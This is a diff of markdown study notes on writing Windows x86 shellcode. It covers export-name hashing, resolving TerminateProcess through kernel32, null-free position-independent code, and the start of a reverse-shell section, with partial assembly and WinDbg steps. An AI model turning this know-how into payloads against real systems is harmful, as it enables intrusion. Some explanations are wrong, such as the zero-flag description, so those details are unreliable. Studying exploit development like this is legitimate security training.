@@ -272,46 +272,47 @@ Instead of comparing the string literals, or taking a subset of a string name to
 
 shellcode edits to compute hash:
 ```
-    " compute_hash:                      "  #
+    " hash_prep:                      "  #
     "   xor   eax, eax                  ;"  #   NULL EAX
     "   cdq                             ;"  #   NULL EDX
     "   cld                             ;"  #   Clear direction
 
-    " compute_hash_again:                "  #
+    " hash_loop:                "  #
     "   lodsb                           ;"  #   Load the next byte from esi into al
     "   test  al, al                    ;" #   Check for NULL terminator
-    "   jz    compute_hash_finished     ;"  #   If the ZF is set, we've hit the NULL term
+    "   jz    hash_finished     ;"  #   If the ZF is set, we've hit the NULL term
     "   ror   edx, 0x0d                 ;"  #   Rotate edx 13 bits to the right
     "   add   edx, eax                  ;"  #   Add the new byte to the accumulator
-    "   jmp   compute_hash_again        ;"  #   Next iteration
+    "   jmp   hash_loop        ;"  #   Next iteration
 
-    " compute_hash_finished:             "  #
+    " hash_finished:             "  #
 ```
 
-`compute_hash:` (bad name, should be like `compute_hash_prep`)
+`hash_prep:` (bad name, should be like `hash_prep_prep`)
 1. `xor eax, eax` : zero out the eax registers
 2. `cdq` : zero out the edx register by equaling it to eax
 3. `cld` : clears the direction flag (DF) meaning all string operations will increment the index registers, ESI (pointing to a symbol name) and EDI
 
-`compute_hash_again:` (this is the actual hash compute)
+`hash_loop:` (this is the actual hash compute)
 1. `lodsb` : load a string byte from esi into al, increments esi afterwards (due to DF)
-2. `test al, al` : check equivalence, if al is 0 (hit null terminator) it will set ZF to 0
-3. `jz compute_hash_finished` : jump out if ZF=0 / null terminator hit
+2. `test al, al` : bitwise AND, if al is 0 (hit null terminator) it will set ZF to 0
+3. `jz hash_finished` : jump out if ZF=0 / null terminator hit
 4. `ror edx, 0x0d` : perform a 13 bit rotation of the the data in edx (our accumulator which is 0 at first)
 5. `add edx, eax` : add the string byte to the accumulator before moving to the next byte
-6. `jmp compute_hash_again` : repeat for the next byte in the string
+6. `jmp hash_loop` : repeat for the next byte in the string
 
 The above generates a unique (apparently no collisions) four-byte hash that can be compared against a pre-computed hash using the same method. 
 The [[Python Rotation Hash]] : generate that hash using the same algorithm
 
-Step through the assembly code again in WinDbg to ensure that the hash generated in edx during the `compute_hash_again` matches the pre-generated one.
+Step through the assembly code again in WinDbg to ensure that the hash generated in edx during the `hash_loop` matches the pre-generated one.
 
 
 ### Fetching the VMA of a Function
-We have the means to identify a specific function from Export Directory Table. Now feeding the script a pre-computed hash we find the VMA, the address in memory, of that specified function. In this case, we look specifically at TerminateProcess so we can exit the hijacked process gracefully.
+We have the means to identify a specific function from Export Directory Table. Now, feeding the script a pre-computed hash we find the VMA, the address in memory, of that specified function. In this case, we look specifically at TerminateProcess so we can exit the hijacked process gracefully.
 
 shellcode modifications:
-```CODE = (
+```
+CODE = (
     " start:                             "  #
 ...
     "   push  0x78b5b983                ;"  #   TerminateProcess hash
@@ -323,9 +324,9 @@ shellcode modifications:
 ...
     " find_function_loop:                "  #
 ...
-    " compute_hash_again:                "  #
+    " hash_loop:                "  #
 ...
-    " compute_hash_finished:             "  #
+    " hash_finished:             "  #
 
     " find_function_compare:             "  #
     "   cmp   edx, [esp+0x24]           ;"  #   Compare the computed hash with the requested hash
@@ -348,8 +349,8 @@ TerminateProcess docs: https://learn.microsoft.com/en-us/windows/win32/api/proce
 2. `call find_function`
 3. `xor ecx, ecx` : zero out
 4. `push ecx` : push uExitCode parameter tot the syscall, 0 meaning all good
-5. `push 0xffffffff` : push hProcess parameter, a -1 "pseudo-handle" (interpreted as the current process handle)
-6. `call eax` : call TerminateProces using the returned VMA from find_function
+5. `push 0xffffffff` : push hProcess parameter, a -1 "psuedo-handle" (interpreted as the current process handle)
+6. `call eax` : call TerminateProcess using the returned VMA from find_function
 
 `find_function_compare:`
 1. `cmp edx, [esp+0x24]` : compares the generated hash to the pre-gen hash on the stack
@@ -363,7 +364,7 @@ TerminateProcess docs: https://learn.microsoft.com/en-us/windows/win32/api/proce
 9. `add eax, ebx` : get specific function's VMA
 10. `mov [esp+0x1c], eax` : Overwrite the eax value stored on stack from pushad so that it returns the specified functions address instead when popad is executed
 
-Run again in WinDbg, set a software breakpoint at the jump in `find_function_compare`, then step through. Stop once we get the VMA of the TerminateProcess function and `u eax` to confirm we see `KERNEL32!TerminateProcessStub`
+Run again in WinDbg, set a software breakpoint at the end of `find_function_compare`, then step through. Stop once we get the VMA of the TerminateProcess function and `u eax` to confirm we see `KERNEL32!TerminateProcessStub`
 Also step over the call to TerminateProcess to ensure that the shellcode exits cleanly (ntdll!KiFastSystemCallRet). Commenting out the `int3` in the shellcode and running should also result in a clean exit vs a crash.
 
 TerminateProcess prototype: https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-terminateprocess
@@ -372,20 +373,21 @@ TerminateProcess prototype: https://learn.microsoft.com/en-us/windows/win32/api/
 We can now resolve any symbol exported by kernel32.dll. Now let's take a step back to shellcode portability.
 
 
-# NULL-Free Position-Independent Shellcode (PIC)  
-Running the python script in WinDbg, we'll notice that some of the generated opcodes contain null bytes. This is a problem when transmitting over a socket connection like in an exploitation context.  
+# NULL-Free Position-Independent Shellcode (PIC)
+Running the python script in WinDbg, we'll notice that some of the generated opcodes contain null bytes (particularly right at the start). This is a problem when our input is being interpreted as a string, like in any overflow context.  
   
 ### Avoiding Null Bytes  
-Take a look at each of the first instruction generating null bytes:  
+Take a look at the first instruction generating null bytes:  
 - `sub esp, 0x200` : can be converted to an add with a negative value -> `add esp, 0xfffffe00` (WinDbg: `? 0x0 - 0x200`)  
 - Repeat this process for arithmetic generated null bytes  
 - How do we avoid null bytes generated by call instructions?  
   
 ### Position-Independent Shellcode  
 Call instructions will either generate a near call with a relative offset, or a far call with an absolute address.  
-While we could move all the functions above the corresponding call (to generate negative relative offsets), the better solution is to dynamically find the absolute address of each function and store it in a register. This is usually whats done by a decoder with an encoded payload.  
+While we could move all the functions above the corresponding call (to generate negative relative offsets), a more versatile solution is to dynamically find the absolute address of each function and store it in a register. This is what's usually done by a decoder with an encoded payload.  
+> The easy solution would be to immediately `jmp` down to a `main:` logic function and only call upwards functions from there
   
-`start:` code modifications:  
+`start` code modifications and dynamic address call to `find_function`:
 ```  
 CODE = (  
     " start:                             "  #  
@@ -422,11 +424,13 @@ CODE = (
 ...  
 ```  
   
-1. `find_kernel32:` has moved right after start, therefore no longer requiring an explicit call.  
+1. `find_kernel32:` has moved right after the first two `start` instructions, therefore no longer requiring an explicit call.  The rest of `start` is moved around, shown later.
 2. `find_function_shorten:` executes after `next_module` resolves, contains a short jump down to `find_function_shorten_bnc` which is small enough to not contain null bytes.  
 3. `find_function_shorten_bnc:` immediately calls to `find_function_ret` (at a negative offset location), storing a return address to the stack pointing to the first instruction of `find_function`.  
-4. `find_function_ret:` pops the previous return value off the stack and moves it into a another arbitrary stack location for future use (using `call dword ptr [ebp+0x04]`), then short jumps down to another function.  
-  
+4. `find_function_ret:` pops that return value off the stack and moves it into a another arbitrary stack location for future use (using `call dword ptr [ebp+0x04]`), then short jumps down to another function.  
+
+
+`start` code functionality new functions:
 ```  
 ...  
     " find_function_finished:            "  #  
@@ -445,15 +449,8 @@ CODE = (
     "   call dword ptr [ebp+0x10]       ;"  #   Call TerminateProcess  
 ```  
   
-5. `resolve_symbols_kernel32:` now calls `find_function` using an address call from the stack `call dword ptr [ebp+0x04]`  
-6. Take note also that the call to `find_function` has moved to a new function after `find_function_finished` due to the new order of the functions  
-  
-Run again in WinDbg to examine the process for dynamically retrieving. Set a breakpoint at `find_function_shorten_bnc`.  
-...  
-Confirm no null bytes are generated.  
-Let the script run through.  
-  
-  
+5. `resolve_symbols_kernel32:` responsible for the `find_function` call, previously in `start`, but now using the address from the stack `call dword ptr [ebp+0x04]`  
+6. `exec_shellcode:` performs the syscall function to TerminateProcess, previously in `start` 
 # Reverse Shell  
 A common shellcode expoloit is the reverse shell. Most of the required APIs are exported by `Ws2_32.dll`.  
 The initialization chain for the connection will be:  
